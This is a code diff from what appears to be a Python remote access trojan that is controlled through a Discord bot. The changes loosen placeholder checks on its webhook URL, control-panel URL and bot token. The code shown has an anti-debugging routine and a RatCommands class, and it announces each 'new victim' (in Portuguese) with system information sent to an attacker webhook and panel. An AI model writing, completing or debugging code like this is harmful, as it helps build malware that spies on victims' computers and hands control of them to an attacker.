@@ -24,7 +24,7 @@ def anti_debug():
         pass
 
 def send_webhook(msg):
-    if WEBHOOK_URL and WEBHOOK_URL != "WEBHOOK_PLACEHOLDER":
+    if WEBHOOK_URL and "PLACEHOLDER" not in WEBHOOK_URL:
         try:
             req.post(WEBHOOK_URL, json={"content": msg}, timeout=10)
         except:
@@ -108,7 +108,7 @@ class RatCommands:
 rat = RatCommands()
 
 def register_panel():
-    if PANEL_URL and PANEL_URL != "PANEL_URL_PLACEHOLDER":
+    if PANEL_URL and "PLACEHOLDER" not in PANEL_URL:
         try:
             from central_client import CentralClient
             client = CentralClient(PANEL_URL, platform.node())
@@ -121,7 +121,7 @@ def register_panel():
 async def on_ready():
     info = f"**Nova vitima conectada!**\n```\n{RatCommands.sysinfo()}\n```"
     send_webhook(info)
-    if PANEL_URL and PANEL_URL != "PANEL_URL_PLACEHOLDER":
+    if PANEL_URL and "PLACEHOLDER" not in PANEL_URL:
         threading.Thread(target=register_panel, daemon=True).start()
 
 @bot.event
@@ -227,7 +227,7 @@ if __name__ == "__main__":
     
     while True:
         try:
-            if TOKEN and TOKEN != "DISCORD_TOKEN_PLACEHOLDER":
+            if TOKEN and "PLACEHOLDER" not in TOKEN:
                 bot.run(TOKEN, reconnect=True, log_level=40)
             else:
                 time.sleep(60)
